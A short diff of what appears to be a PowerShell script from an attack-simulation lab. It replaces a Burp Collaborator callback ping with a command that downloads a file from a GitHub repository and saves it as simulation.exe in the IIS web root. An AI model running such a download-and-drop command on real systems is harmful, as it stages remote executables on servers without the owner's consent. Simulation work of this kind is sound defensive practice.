@@ -1,1 +1,3 @@
-Test-Connection -ComputerName cp52y3f6nhduq5aey8s6jtbhr8xyln.burpcollaborator.net
+[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]'Tls,Tls11,Tls12'
+
+Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/aguggenberger/iv-lab/main/simulation.tmp' -OutFile 'C:\inetpub\wwwroot\simulation.exe'
